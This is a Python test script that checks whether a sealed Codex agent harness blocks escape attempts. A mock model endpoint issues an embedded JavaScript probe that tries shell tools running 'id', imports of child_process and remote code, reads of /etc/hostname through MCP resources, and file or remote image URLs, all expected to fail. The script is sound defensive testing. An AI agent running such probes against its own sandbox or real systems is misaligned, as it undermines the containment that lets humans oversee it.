"""Force a hostile code-mode script through the sealed Codex and print what came back.

Usage: python3 dev/codex-sandbox-probe.py /path/to/codex
A scripted local endpoint plays the model: its first reply is an `exec` call
that probes for Node globals, imports, non-Daycare tools, file reads through
MCP resources, and file or remote image URLs. No credentials or model calls.
Every probe should fail; only Daycare tools and the resource helpers appear.
"""
import http.server, json, os, re, subprocess, sys, tempfile, threading
from pathlib import Path
binary = str(Path(sys.argv[1]).resolve())
src = (Path(__file__).resolve().parent.parent / "src/agent/codex/launch.rs").read_text()
def array(name):
    body = src.split("pub const " + name + ":", 1)[1].split("];", 1)[0]
    return [raw or q for raw, q in re.findall(r'r#"(.*?)"#|"([^"]*)"', body)]
PROBE = r'''
const r = {};
for (const g of ["require","process","fetch","Deno","XMLHttpRequest","WebSocket","console","WebAssembly"]) r["typeof_"+g] = typeof globalThis[g];
r.tools = Object.keys(tools).sort();
for (const name of ["exec_command","shell","shell_command","apply_patch","read_file","list_dir","view_image","write_stdin","request_user_input_async","clock__curr_time","web__run","spawn_agent"]) {
  try { await tools[name]({cmd:"id", command:["id"], path:"/etc/hostname"}); r["call_"+name] = "CALLED"; }
  catch (e) { r["call_"+name] = "ERR " + String(e).slice(0,90); }
}
for (const m of ["fs","node:child_process","https://example.com/x.js","file:///etc/hostname"]) {
  try { await import(m); r["import_"+m] = "LOADED"; } catch (e) { r["import_"+m] = "ERR " + String(e).slice(0,90); }
}
try { r.read_resource = JSON.stringify(await tools.read_mcp_resource({server:"daycare", uri:"file:///etc/hostname"})).slice(0,200); }
catch (e) { r.read_resource = "ERR " + String(e).slice(0,160); }
try { r.read_other_server = JSON.stringify(await tools.read_mcp_resource({server:"filesystem", uri:"file:///etc/hostname"})).slice(0,200); }
catch (e) { r.read_other_server = "ERR " + String(e).slice(0,160); }
try { image("file:///etc/hostname"); r.image_file = "ACCEPTED"; } catch (e) { r.image_file = "ERR " + String(e).slice(0,90); }
try { image("https://example.com/a.png"); r.image_http = "ACCEPTED"; } catch (e) { r.image_http = "ERR " + String(e).slice(0,90); }
text(JSON.stringify(r, null, 1));
'''
def sse(events):
    return "".join(f"event: {e['type']}\ndata: {json.dumps(e)}\n\n" for e in events).encode()
with tempfile.TemporaryDirectory(dir=os.environ["HOME"] + "/.cache") as s:
    root = Path(s)
    for n in ["home", "codex", "ws"]: (root/n).mkdir()
    env = {"PATH": os.environ["PATH"], "HOME": str(root/"home"), "CODEX_HOME": str(root/"codex")}
    cat = json.loads(subprocess.check_output([binary, "debug", "models", "--bundled"], env=env, text=True))
    m = next(x for x in cat["models"] if x["slug"] == "gpt-6.1-sol"); m["apply_patch_tool_type"] = None; m["experimental_supported_tools"] = []
    (root/"m.json").write_text(json.dumps({"models": [m]}))
    reqs = []; mcp_calls = []
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_POST(self):
            r = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
            if self.path == "/mcp":
                if "id" not in r: self.send_response(202); self.end_headers(); return
                mcp_calls.append(r["method"])
                res = {"initialize": {"protocolVersion": "2024-11-05", "capabilities": {"tools": {}}, "serverInfo": {"name": "daycare", "version": "t"}},
                       "tools/list": {"tools": [{"name": "daycare_probe", "description": "probe", "inputSchema": {"type": "object", "properties": {}}}]}}.get(r["method"])
                body = {"jsonrpc": "2.0", "id": r["id"], "result": res} if res is not None else {"jsonrpc": "2.0", "id": r["id"], "error": {"code": -32601, "message": "method not found: " + r["method"]}}
                self.send_response(200); self.send_header("Content-Type", "application/json"); self.end_headers(); self.wfile.write(json.dumps(body).encode()); return
            reqs.append(r)
            n = len(reqs)
            if n == 1:
                out = {"type": "custom_tool_call", "id": "ctc_1", "call_id": "call_probe", "name": "exec", "input": PROBE, "status": "completed"}
            else:
                out = {"type": "message", "id": "msg_2", "role": "assistant", "status": "completed", "content": [{"type": "output_text", "text": "done", "annotations": []}]}
            events = [{"type": "response.created", "response": {"id": f"resp_{n}"}},
                      {"type": "response.output_item.done", "output_index": 0, "item": out},
                      {"type": "response.completed", "response": {"id": f"resp_{n}", "usage": {"input_tokens": 1, "output_tokens": 1, "total_tokens": 2, "input_tokens_details": {"cached_tokens": 0}, "output_tokens_details": {"reasoning_tokens": 0}}}}]
            self.send_response(200); self.send_header("Content-Type", "text/event-stream"); self.end_headers(); self.wfile.write(sse(events))
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H); threading.Thread(target=srv.serve_forever, daemon=True).start(); p = srv.server_port
    settings = array("SEAL_SETTINGS") + ['model="gpt-6.1-sol"', 'model_catalog_json=' + json.dumps(str(root/"m.json")), 'developer_instructions="Daycare probe persona"',
        'model_provider="mock"', 'model_providers.mock.name="mock"', f'model_providers.mock.base_url="http://127.0.0.1:{p}/v1"', 'model_providers.mock.wire_api="responses"', 'model_providers.mock.requires_openai_auth=false',
        f'mcp_servers.daycare.url="http://127.0.0.1:{p}/mcp"', 'mcp_servers.daycare.omit_tools_from=["deferred"]', 'mcp_servers.daycare.required=true', 'mcp_servers.daycare.default_tools_approval_mode="approve"']
    args = [x for f in array("DISABLED_FEATURES") for x in ["--disable", f]] + [x for f in array("ENABLED_FEATURES") for x in ["--enable", f]] + [x for st in settings for x in ["-c", st]]
    out = subprocess.run([binary, "exec", "--json", "--ignore-user-config", "--ignore-rules", "--skip-git-repo-check", *args, "probe"], cwd=root/"ws", env=env, capture_output=True, text=True, timeout=90, stdin=subprocess.DEVNULL)
    print("exit", out.returncode)
    print("JSON stream item types:", [json.loads(l).get("item", {}).get("type") or json.loads(l)["type"] for l in out.stdout.splitlines()])
    print("model requests:", len(reqs), "| MCP methods the daycare server saw:", mcp_calls)
    for item in (reqs[1]["input"] if len(reqs) > 1 else []):
        if item.get("type") == "custom_tool_call_output":
            o = item["output"]
            print("EXEC RESULT RETURNED TO MODEL:\n" + (o if isinstance(o, str) else "\n".join(x.get("text", "") for x in o)))
    srv.shutdown()
